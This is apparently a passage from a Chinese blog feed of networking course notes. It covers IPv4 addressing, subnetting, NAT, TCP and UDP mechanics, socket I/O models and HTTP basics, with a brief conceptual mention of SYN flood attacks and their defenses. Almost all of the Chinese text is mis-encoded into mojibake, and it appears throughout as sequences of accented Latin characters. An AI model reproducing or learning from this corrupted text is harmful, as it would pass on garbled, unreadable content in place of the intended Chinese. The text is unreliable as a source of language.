255.255.255.255(&#x2F;32)æœ‰ä»€ä¹ˆç”¨ï¼Ÿ</strong></p><p>Aï¼š</p><ul><li>è¡¨ç¤ºå•ä¸ªä¸»æœº</li><li>ä¸»æœºè·¯ç”±</li><li>ç”¨äºç‚¹å¯¹ç‚¹é“¾è·¯</li><li>ç”¨äºç¯å›åœ°å€</li></ul><p><strong>Q2ï¼šä¸ºä»€ä¹ˆè¦å‡å»2ä¸ªåœ°å€ï¼ˆç½‘ç»œåœ°å€å’Œå¹¿æ’­åœ°å€ï¼‰ï¼Ÿ</strong></p><p>Aï¼š</p><ul><li>ç½‘ç»œåœ°å€ï¼šæ ‡è¯†ç½‘ç»œæœ¬èº«ï¼Œä¸èƒ½åˆ†é…ç»™ä¸»æœº</li><li>å¹¿æ’­åœ°å€ï¼šå‘é€ç»™æ‰€æœ‰ä¸»æœºï¼Œä¸èƒ½åˆ†é…ç»™å•ä¸ªä¸»æœº</li></ul><p><strong>Q3ï¼š0.0.0.0&#x2F;0æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿ</strong></p><p>Aï¼š</p><ul><li>é»˜è®¤è·¯ç”±</li><li>åŒ¹é…æ‰€æœ‰åœ°å€</li><li>å½“æ²¡æœ‰æ›´å…·ä½“çš„è·¯ç”±æ—¶ä½¿ç”¨</li></ul><p><strong>Q4ï¼šNATä¼šå½±å“ç½‘ç»œæ¸¸æˆå—ï¼Ÿ</strong></p><p>Aï¼š</p><ul><li>ä¼šå½±å“</li><li>å¯¹ç§°NATæœ€éš¾ç©¿é€</li><li>éœ€è¦ä½¿ç”¨STUNã€TURNç­‰æŠ€æœ¯</li><li>æˆ–ä½¿ç”¨UPnPè‡ªåŠ¨æ˜ å°„</li></ul><p><strong>Q5ï¼šIPv4åœ°å€çœŸçš„ä¸å¤Ÿç”¨äº†å—ï¼Ÿ</strong></p><p>Aï¼š</p><ul><li>ç†è®ºä¸Šä¸å¤Ÿï¼ˆ43äº¿ &lt; å…¨çƒè®¾å¤‡æ•°ï¼‰</li><li>å®é™…ä¸Šé€šè¿‡NATç¼“è§£</li><li>é•¿æœŸè§£å†³æ–¹æ¡ˆæ˜¯IPv6</li></ul><hr><h2 id="9-æ€»ç»“"><a href="#9-æ€»ç»“" class="headerlink" title="9. æ€»ç»“"></a>9. æ€»ç»“</h2><p>ä»Šå¤©æˆ‘ä»¬å­¦ä¹ äº†ï¼š</p><h3 id="æ ¸å¿ƒçŸ¥è¯†ç‚¹"><a href="#æ ¸å¿ƒçŸ¥è¯†ç‚¹" class="headerlink" title="æ ¸å¿ƒçŸ¥è¯†ç‚¹"></a>æ ¸å¿ƒçŸ¥è¯†ç‚¹</h3><ol><li><p><strong>IPåè®®åŸºç¡€</strong>ï¼š</p><ul><li>æ— è¿æ¥ã€ä¸å¯é ã€å°½åŠ›è€Œä¸º</li><li>ç½‘ç»œå±‚åè®®</li><li>è´Ÿè´£å¯»å€å’Œè·¯ç”±</li></ul></li><li><p><strong>IPv4åœ°å€</strong>ï¼š</p><ul><li>32ä½åœ°å€</li><li>ç‚¹åˆ†åè¿›åˆ¶è¡¨ç¤º</li><li>A&#x2F;B&#x2F;C&#x2F;D&#x2F;Eç±»åœ°å€</li><li>ç§æœ‰åœ°å€å’Œç‰¹æ®Šåœ°å€</li></ul></li><li><p><strong>å­ç½‘åˆ’åˆ†</strong>ï¼š</p><ul><li>å­ç½‘æ©ç </li><li>CIDRè¡¨ç¤ºæ³•</li><li>VLSM</li><li>è·¯ç”±èšåˆ</li></ul></li><li><p><strong>IPæŠ¥æ–‡</strong>ï¼š</p><ul><li>20-60å­—èŠ‚å¤´éƒ¨</li><li>å…³é”®å­—æ®µï¼šTTLã€Protocolã€åœ°å€</li><li>IPåˆ†ç‰‡å’Œé‡ç»„</li></ul></li><li><p><strong>IPè·¯ç”±</strong>ï¼š</p><ul><li>è·¯ç”±è¡¨</li><li>æœ€é•¿å‰ç¼€åŒ¹é…</li><li>ç›´æ¥è·¯ç”±vsé—´æ¥è·¯ç”±</li></ul></li><li><p><strong>NATæŠ€æœ¯</strong>ï¼š</p><ul><li>åœ°å€è½¬æ¢</li><li>NAPTï¼ˆç«¯å£è½¬æ¢ï¼‰</li><li>NATç±»å‹</li><li>ä¼˜ç¼ºç‚¹</li></ul></li></ol><h3 id="é‡ç‚¹å›é¡¾"><a href="#é‡ç‚¹å›é¡¾" class="headerlink" title="é‡ç‚¹å›é¡¾"></a>é‡ç‚¹å›é¡¾</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs markdown">IPåœ°å€è®¡ç®—å…¬å¼ï¼š<br>ç½‘ç»œåœ°å€ = IPåœ°å€ &amp; å­ç½‘æ©ç <br>å¹¿æ’­åœ°å€ = ç½‘ç»œåœ°å€ | (~å­ç½‘æ©ç )<br>ä¸»æœºæ•°é‡ = 2^(32-å‰ç¼€é•¿åº¦) - 2<br><br>å­ç½‘åˆ’åˆ†æ­¥éª¤ï¼š<br><span class="hljs-bullet">1.</span> ç¡®å®šéœ€è¦çš„å­ç½‘æ•°æˆ–ä¸»æœºæ•°<br><span class="hljs-bullet">2.</span> è®¡ç®—éœ€è¦çš„ä½æ•°<br><span class="hljs-bullet">3.</span> ç¡®å®šæ–°çš„å‰ç¼€é•¿åº¦<br><span class="hljs-bullet">4.</span> è®¡ç®—å­ç½‘èŒƒå›´<br><br>è·¯ç”±æŸ¥æ‰¾ï¼š<br>æœ€é•¿å‰ç¼€åŒ¹é…åŸåˆ™<br><br>NATå·¥ä½œï¼š<br>å†…éƒ¨ç§æœ‰åœ°å€ â†â†’ å¤–éƒ¨å…¬ç½‘åœ°å€<br></code></pre></td></tr></table></figure><h3 id="æ˜å¤©é¢„å‘Š"><a href="#æ˜å¤©é¢„å‘Š" class="headerlink" title="æ˜å¤©é¢„å‘Š"></a>æ˜å¤©é¢„å‘Š</h3><p><strong>ç¬¬23å¤©ï¼šIPv6è¯¦è§£</strong></p><p>å†…å®¹é¢„è§ˆï¼š</p><ul><li>IPv6åœ°å€æ ¼å¼</li><li>IPv6 vs IPv4å¯¹æ¯”</li><li>IPv6ç‰¹æ€§å’Œä¼˜åŠ¿</li><li>IPv6è¿‡æ¸¡æŠ€æœ¯</li><li>IPv6å®è·µ</li></ul><hr><p><strong>ç»§ç»­åŠ æ²¹ï¼</strong> ğŸš€</p><p>ä»Šå¤©æˆ‘ä»¬å­¦ä¹ äº†IPåè®®çš„åŸºç¡€çŸ¥è¯†ï¼Œç†è§£äº†IPåœ°å€ã€å­ç½‘åˆ’åˆ†å’Œè·¯ç”±çš„åŸç†ã€‚è¿™äº›çŸ¥è¯†æ˜¯ç½‘ç»œå·¥ç¨‹å¸ˆçš„å¿…å¤‡æŠ€èƒ½ã€‚æ˜å¤©æˆ‘ä»¬å°†å­¦ä¹ IPv6ï¼Œäº†è§£ä¸‹ä¸€ä»£äº’è”ç½‘åè®®ï¼</p><p><strong>è¿›åº¦ï¼š22&#x2F;180å¤©ï¼ˆ12.2%ï¼‰</strong></p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>21å¤©ï¼šç¬¬ä¸‰å‘¨æ€»ç»“ä¸å®æˆ˜</title>
    <link href="/2025/11/10/21%E5%A4%A9%EF%BC%9A%E7%AC%AC%E4%B8%89%E5%91%A8%E6%80%BB%E7%BB%93%E4%B8%8E%E5%AE%9E%E6%88%98/"/>
    <url>/2025/11/10/21%E5%A4%A9%EF%BC%9A%E7%AC%AC%E4%B8%89%E5%91%A8%E6%80%BB%E7%BB%93%E4%B8%8E%E5%AE%9E%E6%88%98/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬21å¤©ï¼šç¬¬ä¸‰å‘¨æ€»ç»“ä¸å®æˆ˜"><a href="#ç¬¬21å¤©ï¼šç¬¬ä¸‰å‘¨æ€»ç»“ä¸å®æˆ˜" class="headerlink" title="ç¬¬21å¤©ï¼šç¬¬ä¸‰å‘¨æ€»ç»“ä¸å®æˆ˜"></a>ç¬¬21å¤©ï¼šç¬¬ä¸‰å‘¨æ€»ç»“ä¸å®æˆ˜</h1><h2 id="ä»Šæ—¥ç›®æ ‡"><a href="#ä»Šæ—¥ç›®æ ‡" class="headerlink" title="ä»Šæ—¥ç›®æ ‡"></a>ä»Šæ—¥ç›®æ ‡</h2><ul><li>å›é¡¾æœ¬å‘¨æ ¸å¿ƒçŸ¥è¯†ç‚¹</li><li>å®Œæˆç»¼åˆå®æˆ˜é¡¹ç›®</li><li>å­¦ä¹ æ€§èƒ½ä¼˜åŒ–æŠ€å·§</li><li>æŒæ¡è°ƒè¯•å’Œæ’é”™æ–¹æ³•</li><li>äº†è§£å¸¸ç”¨å·¥å…·å’Œèµ„æº</li></ul><hr><h2 id="1-æœ¬å‘¨çŸ¥è¯†å›é¡¾"><a href="#1-æœ¬å‘¨çŸ¥è¯†å›é¡¾" class="headerlink" title="1. æœ¬å‘¨çŸ¥è¯†å›é¡¾"></a>1. æœ¬å‘¨çŸ¥è¯†å›é¡¾</h2><h3 id="1-1-ç¬¬15å¤©ï¼šTCPåè®®åŸºç¡€"><a href="#1-1-ç¬¬15å¤©ï¼šTCPåè®®åŸºç¡€" class="headerlink" title="1.1 ç¬¬15å¤©ï¼šTCPåè®®åŸºç¡€"></a>1.1 ç¬¬15å¤©ï¼šTCPåè®®åŸºç¡€</h3><p><strong>æ ¸å¿ƒçŸ¥è¯†</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs markdown">TCPç‰¹ç‚¹ï¼š<br>âœ… é¢å‘è¿æ¥<br>âœ… å¯é ä¼ è¾“<br>âœ… æœ‰åºä¼ è¾“<br>âœ… å­—èŠ‚æµ<br>âœ… å…¨åŒå·¥<br>âœ… æµé‡æ§åˆ¶<br>âœ… æ‹¥å¡æ§åˆ¶<br><br>ä¸‰æ¬¡æ¡æ‰‹ï¼š<br><span class="hljs-bullet">1.</span> SYN<br><span class="hljs-bullet">2.</span> SYN-ACK<br><span class="hljs-bullet">3.</span> ACK<br><br>å››æ¬¡æŒ¥æ‰‹ï¼š<br><span class="hljs-bullet">1.</span> FIN<br><span class="hljs-bullet">2.</span> ACK<br><span class="hljs-bullet">3.</span> FIN<br><span class="hljs-bullet">4.</span> ACK<br><br>11ç§çŠ¶æ€ï¼š<br>CLOSED â†’ LISTEN â†’ SYN<span class="hljs-emphasis">_SENT â†’ SYN_</span>RECEIVED â†’<br>ESTABLISHED â†’ FIN<span class="hljs-emphasis">_WAIT_</span>1 â†’ FIN<span class="hljs-emphasis">_WAIT_</span>2 â†’<br>CLOSING â†’ TIME<span class="hljs-emphasis">_WAIT â†’ CLOSE_</span>WAIT â†’ LAST<span class="hljs-emphasis">_ACK</span><br></code></pre></td></tr></table></figure><p><strong>å…³é”®æ¦‚å¿µ</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">TIME_WAITï¼š<br><span class="hljs-bullet">- </span>æŒç»­2MSLï¼ˆé€šå¸¸2åˆ†é’Ÿï¼‰<br><span class="hljs-bullet">- </span>ç¡®ä¿å¯¹æ–¹æ”¶åˆ°ACK<br><span class="hljs-bullet">- </span>é˜²æ­¢æ—§è¿æ¥çš„æ•°æ®åŒ…å¹²æ‰°<br><br>SYN Floodæ”»å‡»ï¼š<br><span class="hljs-bullet">- </span>å‘é€å¤§é‡SYNåŒ…<br><span class="hljs-bullet">- </span>ä¸å®Œæˆä¸‰æ¬¡æ¡æ‰‹<br><span class="hljs-bullet">- </span>è€—å°½æœåŠ¡å™¨èµ„æº<br><br>é˜²å¾¡ï¼š<br><span class="hljs-bullet">- </span>SYN Cookie<br><span class="hljs-bullet">- </span>å¢åŠ åŠè¿æ¥é˜Ÿåˆ—<br><span class="hljs-bullet">- </span>ç¼©çŸ­è¶…æ—¶æ—¶é—´<br></code></pre></td></tr></table></figure><h3 id="1-2-ç¬¬16å¤©ï¼šTCPå¯é ä¼ è¾“æœºåˆ¶"><a href="#1-2-ç¬¬16å¤©ï¼šTCPå¯é ä¼ è¾“æœºåˆ¶" class="headerlink" title="1.2 ç¬¬16å¤©ï¼šTCPå¯é ä¼ è¾“æœºåˆ¶"></a>1.2 ç¬¬16å¤©ï¼šTCPå¯é ä¼ è¾“æœºåˆ¶</h3><p><strong>æ ¸å¿ƒçŸ¥è¯†</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs markdown">å¯é æ€§ä¿è¯ï¼š<br><span class="hljs-bullet">1.</span> åºåˆ—å·å’Œç¡®è®¤å·<br><span class="hljs-bullet">2.</span> è¶…æ—¶é‡ä¼ <br><span class="hljs-bullet">3.</span> å¿«é€Ÿé‡ä¼ <br><span class="hljs-bullet">4.</span> æ»‘åŠ¨çª—å£<br><span class="hljs-bullet">5.</span> æµé‡æ§åˆ¶<br><span class="hljs-bullet">6.</span> æ‹¥å¡æ§åˆ¶<br><br>æ»‘åŠ¨çª—å£ï¼š<br>å‘é€çª—å£ = min(æ¥æ”¶çª—å£, æ‹¥å¡çª—å£)<br><br>æ‹¥å¡æ§åˆ¶ç®—æ³•ï¼š<br><span class="hljs-bullet">-</span> æ…¢å¯åŠ¨ï¼ˆSlow Startï¼‰<br><span class="hljs-bullet">-</span> æ‹¥å¡é¿å…ï¼ˆCongestion Avoidanceï¼‰<br><span class="hljs-bullet">-</span> å¿«é€Ÿé‡ä¼ ï¼ˆFast Retransmitï¼‰<br><span class="hljs-bullet">-</span> å¿«é€Ÿæ¢å¤ï¼ˆFast Recoveryï¼‰<br><br>RTOè®¡ç®—ï¼ˆJacobsonç®—æ³•ï¼‰ï¼š<br>SRTT = (1-Î±) Ã— SRTT + Î± Ã— RTT<br>RTTVAR = (1-Î²) Ã— RTTVAR + Î² Ã— |SRTT-RTT|<br>RTO = SRTT + 4 Ã— RTTVAR<br></code></pre></td></tr></table></figure><p><strong>å…³é”®æ¦‚å¿µ</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">TCP Reno vs TCP CUBIC vs BBRï¼š<br><br>TCP Renoï¼š<br><span class="hljs-bullet">- </span>ç»å…¸ç®—æ³•<br><span class="hljs-bullet">- </span>åŸºäºä¸¢åŒ…<br><span class="hljs-bullet">- </span>é€‚åˆä½å»¶è¿Ÿç½‘ç»œ<br><br>TCP CUBICï¼š<br><span class="hljs-bullet">- </span>Linuxé»˜è®¤<br><span class="hljs-bullet">- </span>ç«‹æ–¹å¢é•¿<br><span class="hljs-bullet">- </span>é€‚åˆé«˜å¸¦å®½ç½‘ç»œ<br><br>BBRï¼š<br><span class="hljs-bullet">- </span>Googleå¼€å‘<br><span class="hljs-bullet">- </span>åŸºäºå¸¦å®½å’ŒRTT<br><span class="hljs-bullet">- </span>é€‚åˆé«˜å»¶è¿Ÿç½‘ç»œ<br></code></pre></td></tr></table></figure><h3 id="1-3-ç¬¬17å¤©ï¼šUDPåè®®è¯¦è§£"><a href="#1-3-ç¬¬17å¤©ï¼šUDPåè®®è¯¦è§£" class="headerlink" title="1.3 ç¬¬17å¤©ï¼šUDPåè®®è¯¦è§£"></a>1.3 ç¬¬17å¤©ï¼šUDPåè®®è¯¦è§£</h3><p><strong>æ ¸å¿ƒçŸ¥è¯†</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">UDPç‰¹ç‚¹ï¼š<br>âœ… æ— è¿æ¥<br>âœ… ä¸å¯é <br>âœ… å¿«é€Ÿ<br>âœ… è½»é‡çº§<br>âœ… æ”¯æŒå¹¿æ’­/å¤šæ’­<br><br>UDPå¤´éƒ¨ï¼š8å­—èŠ‚<br><span class="hljs-bullet">- </span>æºç«¯å£ï¼ˆ2å­—èŠ‚ï¼‰<br><span class="hljs-bullet">- </span>ç›®æ ‡ç«¯å£ï¼ˆ2å­—èŠ‚ï¼‰<br><span class="hljs-bullet">- </span>é•¿åº¦ï¼ˆ2å­—èŠ‚ï¼‰<br><span class="hljs-bullet">- </span>æ ¡éªŒå’Œï¼ˆ2å­—èŠ‚ï¼‰<br><br>UDP vs TCPï¼š<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚   ç‰¹æ€§     â”‚  TCP   â”‚  UDP   â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚  å¯é æ€§    â”‚   âœ…   â”‚   âŒ   â”‚<br>â”‚  é€Ÿåº¦      â”‚   æ…¢   â”‚   å¿«   â”‚<br>â”‚  å¼€é”€      â”‚   å¤§   â”‚   å°   â”‚<br>â”‚  è¿æ¥      â”‚   æ˜¯   â”‚   å¦   â”‚<br>â”‚  é¡ºåº      â”‚   æ˜¯   â”‚   å¦   â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br></code></pre></td></tr></table></figure><p><strong>å…³é”®æ¦‚å¿µ</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">UDPä½¿ç”¨åœºæ™¯ï¼š<br><span class="hljs-bullet">- </span>å®æ—¶éŸ³è§†é¢‘ï¼ˆVoIPã€è§†é¢‘ä¼šè®®ï¼‰<br><span class="hljs-bullet">- </span>åœ¨çº¿æ¸¸æˆ<br><span class="hljs-bullet">- </span>DNSæŸ¥è¯¢<br><span class="hljs-bullet">- </span>DHCP<br><span class="hljs-bullet">- </span>æµåª’ä½“<br><span class="hljs-bullet">- </span>IoTè®¾å¤‡é€šä¿¡<br><br>å¯é UDPå®ç°ï¼š<br><span class="hljs-bullet">- </span>åº”ç”¨å±‚å®ç°<br><span class="hljs-bullet">- </span>åºåˆ—å·<br><span class="hljs-bullet">- </span>ACKç¡®è®¤<br><span class="hljs-bullet">- </span>è¶…æ—¶é‡ä¼ <br><span class="hljs-bullet">- </span>æ»‘åŠ¨çª—å£<br></code></pre></td></tr></table></figure><h3 id="1-4-ç¬¬18å¤©ï¼šSocketç¼–ç¨‹è¿›é˜¶"><a href="#1-4-ç¬¬18å¤©ï¼šSocketç¼–ç¨‹è¿›é˜¶" class="headerlink" title="1.4 ç¬¬18å¤©ï¼šSocketç¼–ç¨‹è¿›é˜¶"></a>1.4 ç¬¬18å¤©ï¼šSocketç¼–ç¨‹è¿›é˜¶</h3><p><strong>æ ¸å¿ƒçŸ¥è¯†</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs markdown">é˜»å¡ vs éé˜»å¡ï¼š<br>é˜»å¡ï¼šç­‰å¾…ç›´åˆ°å®Œæˆ<br>éé˜»å¡ï¼šç«‹å³è¿”å›<br><br>IOå¤šè·¯å¤ç”¨ï¼š<br><span class="hljs-bullet">-</span> selectï¼šè·¨å¹³å°ï¼Œæœ€å¤š1024ä¸ª<br><span class="hljs-bullet">-</span> pollï¼šæ— é™åˆ¶ï¼ŒO(n)<br><span class="hljs-bullet">-</span> epollï¼šLinuxä¸“ç”¨ï¼ŒO(1)ï¼Œæœ€å¿«<br><br>Socketé€‰é¡¹ï¼š<br><span class="hljs-bullet">-</span> SO<span class="hljs-emphasis">_REUSEADDRï¼šåœ°å€é‡ç”¨</span><br><span class="hljs-emphasis">- TCP_</span>NODELAYï¼šç¦ç”¨Nagleç®—æ³•<br><span class="hljs-bullet">-</span> SO<span class="hljs-emphasis">_KEEPALIVEï¼šä¿æ´»æœºåˆ¶</span><br><span class="hljs-emphasis">- SO_</span>LINGERï¼šå…³é—­è¡Œä¸º<br><br>æœåŠ¡å™¨æ¶æ„ï¼š<br><span class="hljs-bullet">1.</span> å•çº¿ç¨‹é˜»å¡ï¼šç®€å•ä½†æ…¢<br><span class="hljs-bullet">2.</span> å¤šçº¿ç¨‹ï¼šç®€å•ä½†æœ‰é™<br><span class="hljs-bullet">3.</span> IOå¤šè·¯å¤ç”¨ï¼šé«˜æ€§èƒ½<br><span class="hljs-bullet">4.</span> IOå¤šè·¯å¤ç”¨+çº¿ç¨‹æ± ï¼šæœ€ä½³<br></code></pre></td></tr></table></figure><p><strong>å…³é”®æ¦‚å¿µ</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">C10Ké—®é¢˜ï¼š<br>10000ä¸ªå¹¶å‘è¿æ¥<br><br>è§£å†³æ–¹æ¡ˆï¼š<br><span class="hljs-bullet">- </span>IOå¤šè·¯å¤ç”¨ï¼ˆepollï¼‰<br><span class="hljs-bullet">- </span>éé˜»å¡IO<br><span class="hljs-bullet">- </span>äº‹ä»¶é©±åŠ¨<br><span class="hljs-bullet">- </span>å¼‚æ­¥IO<br><br>ç°åœ¨çš„æŒ‘æˆ˜ï¼š<br>C100Kã€C1000Kï¼ˆç™¾ä¸‡å¹¶å‘ï¼‰<br></code></pre></td></tr></table></figure><h3 id="1-5-ç¬¬19å¤©ï¼šHTTPåè®®åŸºç¡€"><a href="#1-5-ç¬¬19å¤©ï¼šHTTPåè®®åŸºç¡€" class="headerlink" title="1.5 ç¬¬19å¤©ï¼šHTTPåè®®åŸºç¡€"></a>1.5 ç¬¬19å¤©ï¼šHTTPåè®®åŸºç¡€</h3><p><strong>æ ¸å¿ƒçŸ¥è¯†</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">HTTPç‰¹ç‚¹ï¼š<br><span class="hljs-bullet">- </span>åº”ç”¨å±‚åè®®<br><span class="hljs-bullet">- </span>æ— çŠ¶æ€<br><span class="hljs-bullet">- </span>æ˜æ–‡ä¼ è¾“<br><span class="hljs-bullet">- </span>è¯·æ±‚-å“åº”æ¨¡å¼<br><br>HTTPæ ¼å¼ï¼š<br>è¯·æ±‚ = è¯·æ±‚è¡Œ <span class="hljs-code">+ è¯·æ±‚å¤´ +</span> ç©ºè¡Œ + è¯·æ±‚ä½“<br>å“åº” = çŠ¶æ€è¡Œ <span class="hljs-code">+ å“åº”å¤´ +</span> ç©ºè¡Œ + å“åº”ä½“<br><br>HTTPæ–¹æ³•ï¼š<br><span class="hljs-bullet">- </span>GETï¼šæŸ¥è¯¢<br><span class="hljs-bullet">- </span>POSTï¼šåˆ›å»º<br><span class="hljs-bullet">- </span>PUTï¼šæ›´æ–°ï¼ˆå®Œæ•´ï¼‰<br><span class="hljs-bullet">- </span>PATCHï¼šæ›´æ–°ï¼ˆéƒ¨åˆ†ï¼‰<br><span class="hljs-bullet">- </span>DELETEï¼šåˆ é™¤<br><span class="hljs-bullet">- </span>HEADï¼šè·å–å¤´éƒ¨<br><span class="hljs-bullet">- </span>OPTIONSï¼šæŸ¥è¯¢æ–¹æ³•<br><br>çŠ¶æ€ç ï¼š<br>1xxï¼šä¿¡æ¯<br>2xxï¼šæˆåŠŸï¼ˆ200 OKï¼‰<br>3xxï¼šé‡å®šå‘ï¼ˆ301ã€302ã€304ï¼‰<br>4xxï¼šå®¢æˆ·ç«¯é”™è¯¯ï¼ˆ400ã€401ã€403ã€404ï¼‰<br>5xxï¼šæœåŠ¡å™¨é”™è¯¯ï¼ˆ500ã€502ã€503ï¼‰<br></code></pre></td></tr></table></figure><p><strong>å…³é”®æ¦‚å¿µ</strong>ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Cookie</span> vs Sessionï¼š<br><span class="hljs-attribute">Cookie</span>ï¼šå®¢æˆ·ç«¯å­˜å‚¨<br><span class="hljs-attribute">Session</span>ï¼šæœåŠ¡å™¨å­˜å‚¨<br><br><span class="hljs-attribute">HTTP</span>ç‰ˆæœ¬ï¼š<br><span class="hljs-attribute">HTTP</span>/<span class="hljs-number">1</span>.<span class="hljs-number">0</span>ï¼šçŸ­è¿æ¥<br><span class="hljs-attribute">HTTP</span>/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>ï¼šæŒä¹…è¿æ¥<br><span class="hljs-attribute">HTTP</span>/<span class="hljs-number">2</span>ï¼šå¤šè·¯å¤ç”¨ã€äºŒè¿›åˆ¶<br><span class="hljs-attribute">HTTP</span>/<span class="hljs-number">3</span>ï¼šåŸºäºQUIC(UDP)<br></code></pre></td></tr></table></figure><h3 id="1-6-ç¬¬20å¤©ï¼šHTTPSå’Œå®‰å…¨"><a href="#1-6-ç¬¬20å¤©ï¼šHTTPSå’Œå®‰å…¨" class="headerlink" title="1.6 ç¬¬20å¤©ï¼šHTTPSå’Œå®‰å…¨"></a>1.6 ç¬¬20å¤©ï¼šHTTPSå’Œå®‰å…¨</h3><p><strong>æ ¸å¿ƒçŸ¥è¯†</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 